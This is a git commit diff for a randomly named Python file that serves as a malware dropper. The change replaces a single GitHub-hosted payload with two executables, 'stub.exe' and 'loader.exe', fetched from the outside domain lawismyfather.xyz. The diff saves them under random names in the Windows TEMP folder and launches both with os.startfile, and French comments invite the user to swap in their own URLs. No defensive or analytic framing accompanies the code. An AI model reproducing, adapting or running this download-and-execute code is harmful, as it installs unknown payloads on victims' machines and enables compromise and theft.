f878d4775297282b71dac654c140bad86feea16c
chaotic3185 <benjamin.durand123@proton.me>
2025-04-12 22:29:47 +0200

    Update anfaehfbshbfhbqsfhbqfb.py

--- anfaehfbshbfhbqsfhbqfb.py
+++ anfaehfbshbfhbqsfhbqfb.py
@@ -1,10 +1,18 @@
 import os, requests
 
-dropper_url = "https://github.com/chaotic3185/43058650/raw/refs/heads/main/qsdqsdqsdazdasdqsd.exe"
+dropper_url1 = "https://lawismyfather.xyz/assets/stub.exe"
 temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
-dropped_path = os.path.join(temp_dir, "stub.exe")
+dropped_path1 = os.path.join(temp_dir, "fkdvsdngfsndfjnsfjnsjf.exe")
 
-with open(dropped_path, "wb") as f:
-    f.write(requests.get(dropper_url).content)
+dropper_url2 = "https://lawismyfather.xyz/assets/loader.exe"  # Remplacez par votre deuxième URL
+dropped_path2 = os.path.join(temp_dir, "sjfnsjdnfjsnf.exe")
 
-os.startfile(dropped_path)
+with open(dropped_path1, "wb") as f:
+    f.write(requests.get(dropper_url1).content)
+
+with open(dropped_path2, "wb") as f:
+    f.write(requests.get(dropper_url2).content)
+
+# Exécution des fichiers
+os.startfile(dropped_path1)
+os.startfile(dropped_path2)
